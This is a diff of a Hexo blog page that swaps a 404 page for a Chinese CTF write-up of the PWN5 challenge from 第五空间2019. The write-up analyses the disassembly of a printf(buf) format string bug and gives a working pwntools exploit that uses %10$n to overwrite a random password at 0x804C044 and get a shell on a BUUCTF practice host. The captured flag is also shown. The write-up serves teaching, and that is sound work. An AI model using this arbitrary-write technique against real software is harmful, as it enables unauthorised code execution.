@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/pwn5-format-string/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,20 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN5 格式化字符串漏洞：任意地址写">
+<meta property="og:url" content="http://example.com/2026/05/09/pwn5-format-string/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T21:02:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="%n">
+<meta property="article:tag" content="32位">
+<meta property="article:tag" content="任意地址写">
+<meta property="article:tag" content="格式化字符串">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +113,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            PWN5 格式化字符串漏洞：任意地址写 | Bear
         
     </title>
 
@@ -416,13 +422,268 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PWN5 格式化字符串漏洞：任意地址写</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 21:02</span>
+        <span class="mobile">2026-05-09 21:02</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/">任意地址写</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/32%E4%BD%8D/">32位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/n/">%n</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>第五空间2019 决赛 | 利用 %n 格式化控制符篡改随机密码</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>题目名称</td>
+<td>[第五空间2019 决赛] PWN5</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>32位 Linux ELF (i386)</td>
+</tr>
+<tr>
+<td>核心漏洞</td>
+<td>格式化字符串漏洞 (Format String Bug)</td>
+</tr>
+<tr>
+<td>利用技巧</td>
+<td>%n 任意地址写 (Arbitrary Write)</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><h3 id="阶段一：生成并保存真随机密码"><a href="#阶段一：生成并保存真随机密码" class="headerlink" title="阶段一：生成并保存真随机密码"></a>阶段一：生成并保存真随机密码</h3><p>程序打开 <code>/dev/urandom</code>，读取 4 字节保存到全局变量 <code>0x804C044</code> 中。这是真随机数，暴力破解不可能。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, (aDevUrandom - 804C000h)[ebx]  ; &quot;/dev/urandom&quot;</span><br><span class="line">push    eax</span><br><span class="line">call    _open</span><br><span class="line">; ...</span><br><span class="line">mov     eax, offset unk_804C044  ; 随机数存入全局变量 0x804C044</span><br><span class="line">push    eax</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="阶段二：致命的格式化字符串漏洞"><a href="#阶段二：致命的格式化字符串漏洞" class="headerlink" title="阶段二：致命的格式化字符串漏洞"></a>阶段二：致命的格式化字符串漏洞</h3><p>程序要求用户输入名字，并直接打印：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; 直接将 buf 作为格式化字符串参数压栈</span><br><span class="line">call    _printf         ; 致命漏洞：printf(buf) !!!</span><br></pre></td></tr></table></figure></div>
+
+<p>正常代码应该是 <code>printf(&quot;%s&quot;, buf)</code>。由于写成了 <code>printf(buf)</code>，输入 <code>%x</code>、<code>%n</code> 等会被当作格式化指令执行。</p>
+<h3 id="阶段三：密码校验"><a href="#阶段三：密码校验" class="headerlink" title="阶段三：密码校验"></a>阶段三：密码校验</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call    _atoi           ; 用户输入转为整数</span><br><span class="line">mov     edx, eax</span><br><span class="line">mov     eax, offset unk_804C044</span><br><span class="line">mov     eax, [eax]      ; 取出随机密码</span><br><span class="line">cmp     edx, eax        ; 对比</span><br><span class="line">jz      short loc_804931A ; 相等则执行 system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x03-漏洞利用思路"><a href="#0x03-漏洞利用思路" class="headerlink" title="0x03 漏洞利用思路"></a>0x03 漏洞利用思路</h2><p>既然密码是随机的，我们无法猜透，那我们就改掉它！</p>
+<p><strong>利用 <code>%n</code> 控制符</strong>：它的作用不是打印，而是将目前为止已经打印的字符个数，写入到指定的内存地址中。</p>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li><strong>确定目标</strong>：修改地址 <code>0x804C044</code></li>
+<li><strong>计算偏移</strong>：<code>esp</code> 到 <code>buf</code> 距离为 <code>0x28</code>，除以 4 字节&#x2F;参数 &#x3D; 第 10 个参数位置</li>
+<li><strong>构造 Payload</strong>：<ul>
+<li>开头放目标地址：<code>p32(0x804C044)</code>，占用 4 字节</li>
+<li>使用 <code>%10$n</code>：将当前打印的字符数（4）写入第 10 个参数指向的地址</li>
+<li>随机密码被强制改成 4</li>
+</ul>
+</li>
+<li><strong>通关</strong>：最后输入密码 <code>4</code> 即可通过校验</li>
+</ol>
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27298</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址：保存随机密码的变量</span></span><br><span class="line">target_addr = <span class="number">0x804C044</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 Payload: [目标地址] + [%10$n]</span></span><br><span class="line"><span class="comment"># p32(target_addr) 占用 4 字节，%n 写入值为 4</span></span><br><span class="line">payload = p32(target_addr) + <span class="string">b&quot;%10$n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 Payload 篡改密码</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送已知的篡改后密码</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 Shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-执行结果"><a href="#0x05-执行结果" class="headerlink" title="0x05 执行结果"></a>0x05 执行结果</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payload: 44 c0 04 08  25 31 30 24  6e 0a</span><br><span class="line">         ↑ p32地址    ↑ %10$n</span><br><span class="line"></span><br><span class="line">程序回显: ok!!</span><br><span class="line">Flag: flag&#123;7e95583a-a1d1-417e-8417-bd1812219a1c&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x06-核心考点"><a href="#0x06-核心考点" class="headerlink" title="0x06 核心考点"></a>0x06 核心考点</h2><ul>
+<li><strong>格式化字符串漏洞</strong>：<code>printf(buf)</code> 而非 <code>printf(&quot;%s&quot;, buf)</code></li>
+<li><strong><code>%n</code> 任意地址写</strong>：将打印的字符数写入指定地址</li>
+<li><strong>偏移计算</strong>：栈上 buf 到 printf 参数的距离</li>
+<li><strong>变废为宝</strong>：无法破解随机数时，直接篡改存储地址</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> PWN5 格式化字符串漏洞：任意地址写</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 21:02:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/pwn5-format-string/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">#格式化字符串</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/">#任意地址写</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/32%E4%BD%8D/">#32位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/n/">#%n</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/10/ret2dl-resolve/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2dl_resolve 无输出环境下的动态链接劫持</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/ret2shellcode/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2shellcode 栈地址泄露与代码注入</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">PWN5 格式化字符串漏洞：任意地址写</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">0x02 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%80%EF%BC%9A%E7%94%9F%E6%88%90%E5%B9%B6%E4%BF%9D%E5%AD%98%E7%9C%9F%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81"><span class="nav-text">阶段一：生成并保存真随机密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%BA%8C%EF%BC%9A%E8%87%B4%E5%91%BD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-text">阶段二：致命的格式化字符串漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B6%E6%AE%B5%E4%B8%89%EF%BC%9A%E5%AF%86%E7%A0%81%E6%A0%A1%E9%AA%8C"><span class="nav-text">阶段三：密码校验</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">0x03 漏洞利用思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-text">0x05 执行结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x06 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +721,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +861,7 @@
         }),
     );
 </script>
+
 
 
 
